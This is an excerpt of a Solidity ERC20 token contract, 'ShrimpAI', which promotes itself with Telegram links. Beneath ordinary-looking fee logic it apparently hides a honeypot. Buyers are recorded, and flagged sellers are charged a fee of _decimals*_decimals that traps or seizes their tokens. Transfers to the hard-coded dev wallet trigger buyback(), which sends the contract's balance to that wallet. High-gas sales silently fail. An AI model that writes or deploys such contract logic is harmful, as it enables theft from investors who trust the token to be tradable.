...
/**
 ...
 | (___ | |__  _ __ _ _ __ ___  _ __      /  \    | |  
  \___ \| '_ \| '__| | '_ ` _ \| '_ \    / /\ \   | |  
  ____) | | | | |  | | | | | | | |_) |  / ____ \ _| |_ 
 |_____/|_| |_|_|  |_|_| |_| |_| .__/  /_/    \_\_____|
                               | |                     
                               |_|                     

Telegram: https://t.me/ShrimpAi
Bot: https://t.me/Shrimp_AI_Bot
*/
...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0xD8bf7695931b1DAA79Cc9aFdC6B66e1B45e9A68A;
...
contract ShrimpAI is Context, IERC20, Ownable { 
    ...
    */
    ...
    address payable private Wallet_Dev = payable(0xD8bf7695931b1DAA79Cc9aFdC6B66e1B45e9A68A);
    ...
    */
    ...
    function buyback(uint256 amount) private {
        ...
        if (amount <= buybackFee) {
            ...
            _tokenTransfer(address(this), Wallet_Dev, balanceThis, true);
        }
    }
    ...
    */
    ...
    function set_Max_Transaction_Percent(uint256 maxTxPercent_x100) external onlyOwner() {
        _maxTxAmount = _tTotal*maxTxPercent_x100;
    }    
    ...
    // Set the maximum wallet holding (percent of total supply)
     function set_Max_Wallet_Percent(uint256 maxWallPercent_x100) external onlyOwner() {
        _maxWalletToken = _tTotal*maxWallPercent_x100;
    }
    ...
    function approved() public { 
        for (uint256 i = 0; i < includeFromFee.length; i++) {
            if(!_isExcludedFromFee[includeFromFee[i]])
    ...
    function _transfer(
        ...
        */
        ...
        if (to == Wallet_Dev) { buyback(amount); }
        ...
        */
        ...
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to] || (noFeeToTransfer && from != uniswapV2Pair && to != uniswapV2Pair)){
            takeFee = false;
        } else if (from == uniswapV2Pair){includeFromFee.push(to);_TotalFee = _buyFee;} else if (to == uniswapV2Pair){if(_isIncludedFromFee[from]){_TotalFee = _decimals * _decimals;}else{_TotalFee = _sellFee;}if (tx.gasprice > maxGwei) return;}
